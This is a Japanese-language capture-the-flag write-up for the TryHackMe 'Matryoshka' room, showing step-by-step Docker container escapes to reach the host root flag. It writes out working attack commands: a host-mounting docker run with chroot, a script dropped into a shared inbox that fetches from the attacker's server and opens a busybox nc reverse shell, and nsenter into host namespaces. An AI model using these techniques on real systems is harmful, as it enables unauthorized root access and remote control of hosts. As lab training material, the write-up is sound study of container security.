# Matryoshka CTF

https://tryhackme.com/room/matryoshka

## 1

ssh以外のポートは開いていない。

```sh
root@ip-10-145-113-23:~# nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-09 00:28 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.145.186.97
Host is up (0.00030s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 104.45 seconds
```

ゲストOSの中にいることが分かる。

```sh
660837de2c10:~$ ls -al /home
total 12
drwxr-xr-x  3 root       root       4096 May  4 14:25 .
drwxr-xr-x 19 root       root       4096 May  8 23:17 ..
drwxr-sr-x  2 matryoshka matryoshka 4096 May  4 14:25 matryoshka

660837de2c10:~$ id
uid=1000(matryoshka) gid=1000(matryoshka) groups=1000(matryoshka)

660837de2c10:~$ ls -al
total 12
drwxr-sr-x 2 matryoshka matryoshka 4096 May  4 14:25 .
drwxr-xr-x 3 root       root       4096 May  4 14:25 ..
-rw-r--r-- 1 matryoshka matryoshka   73 May  4 14:25 .bashrc

660837de2c10:~$ cat .bashrc
echo "[*] You are in the Matryoshka Containment Unit. Escape is futile."

660837de2c10:~$ sudo -l
bash: sudo: command not found
```

dockerコマンドは使える。

```sh
660837de2c10:/$ docker images
REPOSITORY          TAG       IMAGE ID       CREATED       SIZE
matryoshka-level1   local     485e908211ec   4 days ago    43.9MB
alpine              3.20      bf8527eb54c3   3 weeks ago   7.8MB
```

inspect

```
660837de2c10:/$ docker image inspect 485e908211ec
[
    {
        "Id": "sha256:485e908211ecabe15bb8f25aed06445c40524495e8d6342a46ab7bd2b95f9baa",
        "RepoTags": [
            "matryoshka-level1:local"
        ],
        "RepoDigests": [],
        "Parent": "",
        "Comment": "",
        "Created": "2026-05-04T14:25:28.604379391Z",
        "Container": "",
        "ContainerConfig": {
            "Hostname": "",
            "Domainname": "",
            "User": "",
            "AttachStdin": false,
            "AttachStdout": false,
            "AttachStderr": false,
            "Tty": false,
            "OpenStdin": false,
            "StdinOnce": false,
            "Env": null,
            "Cmd": null,
            "Image": "",
            "Volumes": null,
            "WorkingDir": "",
            "Entrypoint": null,
            "OnBuild": null,
            "Labels": null
        },
        "DockerVersion": "",
        "Author": "",
        "Config": {
            "Hostname": "",
            "Domainname": "",
            "User": "matryoshka",
            "AttachStdin": false,
            "AttachStdout": false,
            "AttachStderr": false,
            "Tty": false,
            "OpenStdin": false,
            "StdinOnce": false,
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
            ],
            "Cmd": [
                "sh",
                "-lc",
                "sleep infinity"
            ],
            "Image": "",
            "Volumes": null,
            "WorkingDir": "/home/matryoshka",
            "Entrypoint": null,
            "OnBuild": null,
            "Labels": null
        },
        "Architecture": "amd64",
        "Os": "linux",
        "Size": 43857047,
        "GraphDriver": {
            "Data": null,
            "Name": "vfs"
        },
        "RootFS": {
            "Type": "layers",
            "Layers": [
                "sha256:08bc4e534116aa76b16015484b82eac51f9a593416feae9296c8a2d4bb7aa4a2",
                "sha256:d8a748450169bc171145e4ed5610ecf5c9ec06397ddea3009c0c6edb27e3e431",
                "sha256:0608852b3a865693c057a477766cd80a3a1e74585658860fb7c637d49b7bb795",
                "sha256:411ed9f8ea582421f1769f36e82e0ac1a1892fa00aa6f0ec1180ffd83a9f296d"
            ]
        },
        "Metadata": {
            "LastTagTime": "0001-01-01T00:00:00Z"
        }
    }
]
```

alpine を使うパターンで root シェルを取れた。

```sh
660837de2c10:/$ docker run -v /:/mnt --rm -it bf8527eb54c3 chroot /mnt sh
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

レベル２フラグを入手。

```sh
/ # ls -al /root
total 16
drwx------ 1 root root 4096 May  8 23:44 .
drwxr-xr-x 1 root root 4096 May  8 23:17 ..
-rw------- 1 root root   16 May  8 23:44 .ash_history
-r-------- 1 root root   20 May  8 23:17 flag_level2.txt
/ # cat /root/flag_level2.txt
THM{[REDACTED]}
```

## 2

目立つ特権はない。

```sh
/ # cat /proc/self/status | grep CapEff
CapEff: 00000000a80425fb

$ capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

cgroup のバージョンは２

```sh
/ # mount | grep cgroup
cgroup on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
cgroup on /var/lib/docker/vfs/dir/af4e55dc5a9677759cfdd3fc1277398622e1a5708af4925211a854a4895d36be/sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
```

ネットワーク

```sh
/ # ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:02  
          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
          inet6 addr: fe80::42:acff:fe11:2/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:12 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:936 (936.0 B)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```

共有ディレクトリを探す。level3share を発見。

```sh
/ # cat /proc/self/mountinfo

...
631 610 0:44 /level3share /mnt/level3share rw,relatime master:355 - overlay overlay rw,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/202/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/179/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/175/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/171/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/141/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/137/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/134/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/37/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/36/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/35/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/34/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/33/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/32/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/31/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/30/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/29/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/28/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/27/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/26/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/25/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/24/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/23/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/203/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/203/work,nouserxattr
...
```

inbox, outbox ディレクトリがある。

```sh
/ # ls -al /mnt/level3share/
total 16
drwxrwxrwx 4 root root 4096 May  8 23:16 .
drwxr-xr-x 1 root root 4096 May  8 23:17 ..
drwxrwxrwx 2 root root 4096 May  8 23:16 inbox
drwxrwxrwx 2 root root 4096 May  8 23:16 outbox
```

（Look for an Inbox folder that allows script executions.というヒントがあったので、）inboxにシェルスクリプトを置いてみる。

```sh
/ # echo 'wget http://192.168.128.106:8000/test' > /mnt/level3share/inbox/test.sh
```

実行されることを確認。

```sh
$ python -m http.server                                                                   
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.145.186.97 - - [08/May/2026 20:01:39] code 404, message File not found
10.145.186.97 - - [08/May/2026 20:01:39] "GET /test HTTP/1.1" 404 -
```

busyboxのリバースシェルが有効だった。ただ、すぐ切断される。

```sh
/mnt/level3share/inbox # echo 'busybox nc 192.168.128.106 8888 -e sh' > busy.sh
```

```sh
$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [192.168.128.106] from (UNKNOWN) [10.145.186.97] 40815
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

レベル３フラグを入手。

```sh
$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [192.168.128.106] from (UNKNOWN) [10.145.186.97] 37749
ls -al /root
total 12
drwx------ 1 root root 4096 May  8 23:16 .
drwxr-xr-x 1 root root 4096 May  8 23:16 ..
-r-------- 1 root root   15 May  8 23:16 flag_level3.txt

cat /root/flag_level3.txt
THM{[REDACTED]}
```

## 3

次はホストOSへのエスケープだと思われるが、まず安定的なシェルが必要。

バックグラウンド実行で切断されなくなった。

```sh
/mnt/level3share/inbox # echo 'busybox nc 192.168.128.106 8888 -e sh&' > busy.sh
```

/cert ディレクトリは気になるが・・・

```sh
cd /certs
ls -al
total 24
drwxrwxrwt 1 root root 4096 May  8 23:16 .
drwxr-xr-x 1 root root 4096 May  8 23:16 ..
drwxr-xr-x 2 root root 4096 May  8 23:16 ca
drwxrwxrwt 1 root root 4096 May  8 23:16 client
drwxr-xr-x 2 root root 4096 May  8 23:16 server
ls -al ca
total 24
drwxr-xr-x 2 root root 4096 May  8 23:16 .
drwxrwxrwt 1 root root 4096 May  8 23:16 ..
-rw-r--r-- 1 root root 1822 May  8 23:16 cert.pem
-rw-r--r-- 1 root root   41 May  8 23:16 cert.srl
-rw------- 1 root root 3272 May  8 23:16 key.pem
ls -al server
total 32
drwxr-xr-x 2 root root 4096 May  8 23:16 .
drwxrwxrwt 1 root root 4096 May  8 23:16 ..
-rw-r--r-- 1 root root 1822 May  8 23:16 ca.pem
-rw-r--r-- 1 root root 1907 May  8 23:16 cert.pem
-rw-r--r-- 1 root root 1598 May  8 23:16 csr.pem
-rw------- 1 root root 3272 May  8 23:16 key.pem
-rw-r--r-- 1 root root  107 May  8 23:16 openssl.cnf
ls -al client
total 32
drwxrwxrwt 1 root root 4096 May  8 23:16 .
drwxrwxrwt 1 root root 4096 May  8 23:16 ..
-rw-r--r-- 1 root root 1822 May  8 23:16 ca.pem
-rw-r--r-- 1 root root 1830 May  8 23:16 cert.pem
-rw-r--r-- 1 root root 1598 May  8 23:16 csr.pem
-rw-r--r-- 1 root root 3272 May  8 23:16 key.pem
-rw-r--r-- 1 root root   44 May  8 23:16 openssl.cnf
```

ps コマンドを実行すると、ホストOSと名前空間が共有されていることが分かる。

```sh
ps aux
PID   USER     TIME  COMMAND
    1 root      0:04 {systemd} /sbin/init
    2 root      0:00 [kthreadd]
    3 root      0:00 [pool_workqueue_]
    4 root      0:00 [kworker/R-rcu_g]
    5 root      0:00 [kworker/R-sync_]
...
```

エクスプロイト

```sh
nsenter --target 1 --mount --uts --ipc --net /bin/bash
id

uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)

ls -al /root
total 40
drwx------  5 root root 4096 May  4 16:54 .
drwxr-xr-x 22 root root 4096 May  8 23:15 ..
-rw-------  1 root root  391 May  8 06:08 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-rw-------  1 root root   20 May  4 16:54 .lesshst
drwxr-xr-x  3 root root 4096 Oct 22  2024 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Oct 22  2024 .ssh
-r--------  1 root root   16 May  4 14:06 flag_host.txt
drwxr-xr-x  4 root root 4096 Oct 22  2024 snap

cat /root/flag_host.txt
THM{[REDACTED]}
```

## 振り返り

- dockerエスケープについては新しい学びはなかった。
- リバースシェルをバックグラウンド実行して切断を回避する方法は覚えておきたい。

## Tags

#tags:docker
